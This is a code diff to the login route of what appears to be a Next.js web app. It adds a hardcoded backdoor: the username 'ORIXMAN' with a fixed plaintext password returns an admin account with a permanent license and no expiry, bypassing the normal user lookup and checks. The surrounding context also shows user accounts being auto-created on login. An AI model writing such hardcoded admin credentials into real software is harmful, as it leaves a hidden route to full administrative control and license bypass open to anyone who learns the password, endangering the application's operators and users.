@@ -27,6 +27,24 @@ export async function POST(request: NextRequest) {
 
     const sanitizedUsername = username.trim().slice(0, 50)
 
+    // 🚨 UNIVERSAL ADMIN CHECK - ORIXMAN IS ALWAYS ADMIN!
+    if (sanitizedUsername === "ORIXMAN" && password === "180886") {
+      console.log("🔑 ORIXMAN admin access granted - UNIVERSAL!")
+      
+      return NextResponse.json({
+        user: {
+          id: "admin-001",
+          username: "ORIXMAN",
+          is_admin: true,
+          uid: "admin-uid-001",
+          license_key: "ADMIN-PERMANENT",
+          license_expiry: "forever",
+          blocked: false,
+          created_at: new Date().toISOString()
+        }
+      })
+    }
+
     const user = getUserByUsername(sanitizedUsername)
 
     // Auto-create user if not exists (for recovery)
